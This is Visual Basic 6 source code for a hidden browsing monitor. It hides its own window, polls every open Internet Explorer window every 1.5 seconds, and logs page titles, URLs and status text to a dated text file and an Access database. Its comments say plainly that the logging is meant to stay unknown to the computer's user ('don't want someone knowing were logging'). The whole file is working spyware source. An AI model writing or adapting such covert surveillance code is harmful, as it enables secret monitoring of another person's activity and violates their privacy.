VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   855
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   2325
   LinkTopic       =   "Form1"
   ScaleHeight     =   855
   ScaleWidth      =   2325
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1500
      Left            =   120
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim iewindow As InternetExplorer          'refrence to the internet explorer shdocvw.dll
Dim currentwinblowz As New ShellWindows

'our list of string's
Dim buffer, allstrings, Statustext, dbase, current_surf _
, logfile, logfilename As String
Dim checkagainst, bufferdays As Integer
Dim startdate, bufferenddate As Date
'Database refrences etc
Dim db As Database
Dim rs As Recordset
Private Sub Form_Load()
'basic setup for our client goes here on form load

bufferdays = 2 'this is how often we should clear the buffer in days & how many
                    'days we wish to log into a file more days more mem usage

startdate = Date 'get todays date to start our buffer of with
bufferenddate = Date + bufferdays 'produce the date when we wish to clear the buffer

logfilename = "private" 'logfile name the client wants to use for the computer
dbase = App.Path & "\dbase.mdb" 'This is the location & name of our database


Me.Hide 'hide away for a while

Timer1.Enabled = True 'fire of our logging
End Sub


Private Sub Timer1_Timer()
On Error Resume Next
logfile = App.Path & "\" & Replace(Date & "_" & logfilename, "/", "_") & ".txt" 'this is the location of our logfile & name currently set to use the date

'check to see if we have to clear out the buffer yet?
If Date > bufferenddate Then
buffer = "" 'get ride of all the data in our buffer
startdate = Date 'better start a new date to clear out again
bufferenddate = Date + bufferdays 'reset the date
'other maintaince sheet.. was putting compression here to compress the logs
End If



'set database
Set db = OpenDatabase(dbase)
Set rs = db.OpenRecordset("select * from log")


Timer1.Enabled = False 'unintilize timer
For Each iewindow In currentwinblowz 'loop through all explorer windows

DoEvents 'give us some flow baby don't want someone knowing were logging

If iewindow.Busy = True Then GoTo busysignal 'if the browser is busy we can just wait and log the prick next round better preformace so the user don't know

Statustext = iewindow.Statustext 'this is just so we have a pretty log ;).. not needed
If Statustext = "" Then Statustext = "Viewing Website"


current_surf = iewindow.LocationName & "|" & iewindow.LocationURL & "|" & Statustext  'get current_surf to = the location name and url and status with the spliter char '|' as i am running a perl cgi script so yeah you might not need this shit



checkagainst = InStr(1, buffer, iewindow.LocationName & "|" & iewindow.LocationURL & "|" & Statustext) 'check through our buffer to see if this is a new occurence or not don't want no freakn dupes....

If checkagainst = 0 Then
'new occurence lets add it to our buffer and now dump to our log
buffer = buffer & current_surf & vbNewLine
Open logfile For Append As #1
Print #1, Date & "|" & Time; "|" & current_surf
Close #1

rs.AddNew   'add new entry to our database
rs!Date = Date
rs!Time = Time
rs!Title = iewindow.LocationName
rs!URL = iewindow.LocationURL
rs!Status = Statustext
rs.Update

End If
busysignal: 'we land here if the explorer window was busy at the time of processing
   Next

Timer1.Enabled = True    'reload timer up
rs.Close    ' close database off

End Sub
